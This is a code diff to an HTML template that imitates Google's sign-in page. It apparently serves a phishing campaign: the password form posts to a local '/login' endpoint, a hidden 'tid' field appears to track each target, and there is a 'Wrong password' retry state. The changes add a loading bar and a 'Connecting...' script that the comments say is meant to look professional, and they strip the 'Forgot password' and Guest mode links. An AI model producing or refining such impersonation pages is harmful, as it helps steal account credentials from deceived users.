@@ -23,6 +23,30 @@
             border: 1px solid #dadce0;
             border-radius: 8px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Loading Bar Animation */
+        #loading-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background-color: #f1f1f1;
+            display: none;
+        }
+        #loading-bar div {
+            height: 100%;
+            background-color: #1a73e8;
+            width: 30%;
+            position: absolute;
+            animation: loading 1.5s infinite linear;
+        }
+        @keyframes loading {
+            0% { left: -30%; }
+            100% { left: 100%; }
         }
 
         @media (max-width: 500px) {
@@ -30,29 +54,10 @@
         }
 
         .logo { margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin: 10px 0 8px; }
+        .subtitle { font-size: 16px; margin-bottom: 30px; }
 
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 0;
-            padding-bottom: 8px;
-            padding-top: 10px;
-        }
-
-        .subtitle {
-            font-size: 16px;
-            font-weight: 400;
-            letter-spacing: 0.1px;
-            line-height: 1.5;
-            margin-bottom: 30px;
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 10px;
-            text-align: left;
-        }
-
+        .input-group { margin-bottom: 10px; text-align: left; }
         input {
             width: 100%;
             padding: 13px 15px;
@@ -61,38 +66,10 @@
             border-radius: 4px;
             box-sizing: border-box;
             outline: none;
-            transition: border 0.2s;
         }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
 
-        input:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
-        }
-
-        /* Wrong Password Styling */
-        .error-border {
-            border: 1px solid #d93025 !important;
-        }
-        .error-border:focus {
-            border: 2px solid #d93025 !important;
-        }
-
-        .error-msg {
-            color: #d93025;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            margin-top: 8px;
-            text-align: left;
-        }
-
-        .links {
-            color: #1a73e8;
-            font-size: 14px;
-            font-weight: 500;
-            text-decoration: none;
-            cursor: pointer;
-        }
+        .error-msg { color: #d93025; font-size: 12px; display: flex; align-items: center; margin-top: 8px; }
 
         .footer-btns {
             display: flex;
@@ -108,21 +85,18 @@
             border: none;
             border-radius: 4px;
             font-weight: 500;
-            font-size: 14px;
             cursor: pointer;
         }
+        .btn-next:disabled { background-color: #ccc; cursor: not-allowed; }
 
-        .btn-next:hover { background-color: #1b66ca; }
-
-        .forgot-pass {
-            text-align: left;
-            margin-top: 10px;
-        }
+        .links { color: #1a73e8; font-size: 14px; text-decoration: none; font-weight: 500; }
     </style>
 </head>
 <body>
 
 <div class="container">
+    <div id="loading-bar"><div></div></div>
+
     <div class="logo">
         <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
             <path d="M7.1 5.4v2.4h5.1c-.2 1.1-.7 2-1.6 2.6-1.1.7-2.4 1-3.5 1-2.9 0-5.3-2.1-5.3-5.2S4.2 1 7.1 1c1.6 0 2.8.6 3.7 1.4l1.8-1.8C11.1.3 9.3-.5 7.1-.5c-3.8 0-6.8 3-6.8 6.9s3 6.9 6.8 6.9c2.1 0 3.8-.7 5.1-2 1.4-1.3 1.9-3.2 1.9-4.9 0-.5 0-.9-.1-1.4H7.1z" fill="#4285F4"></path>
@@ -137,7 +111,7 @@
     <h1>Sign in</h1>
     <p class="subtitle">Use your Google Account</p>
 
-    <form action="/login" method="POST">
+    <form id="loginForm" action="/login" method="POST">
         <input type="hidden" name="tid" value="{{ tid }}">
 
         <div class="input-group">
@@ -149,31 +123,36 @@
             <svg aria-hidden="true" fill="currentColor" width="16px" height="16px" viewBox="0 0 24 24" style="margin-right: 8px;">
                 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
             </svg>
-            Wrong password. Try again or click Forgot password to reset it.
+            Wrong password. Try again.
         </div>
         {% endif %}
 
         <div class="input-group" style="margin-top: 15px;">
-            <input type="password" name="password" 
-                   class="{{ 'error-border' if error_type == 'wrong_pass' else '' }}" 
-                   placeholder="Enter your password" required>
-        </div>
-
-        <div class="forgot-pass">
-            <a href="#" class="links">Forgot password?</a>
-        </div>
-
-        <div style="text-align: left; font-size: 14px; margin-top: 30px; color: #5f6368; line-height: 1.4;">
-            Not your computer? Use Guest mode to sign in privately.<br>
-            <a href="#" class="links" style="font-size: 14px;">Learn more</a>
+            <input type="password" name="password" placeholder="Enter your password" required>
         </div>
 
         <div class="footer-btns">
             <a href="#" class="links">Create account</a>
-            <button type="submit" class="btn-next">Next</button>
+            <button type="submit" id="submitBtn" class="btn-next">Next</button>
         </div>
     </form>
 </div>
+
+<script>
+    // This script handles the "Loading" state so the user doesn't think it's stuck
+    document.getElementById('loginForm').addEventListener('submit', function() {
+        var btn = document.getElementById('submitBtn');
+        var bar = document.getElementById('loading-bar');
+        
+        // Show the blue loading line at the top
+        bar.style.display = 'block';
+        
+        // Disable the button and change text to look professional
+        btn.disabled = true;
+        btn.innerText = 'Connecting...';
+        btn.style.opacity = '0.7';
+    });
+</script>
 
 </body>
 </html>
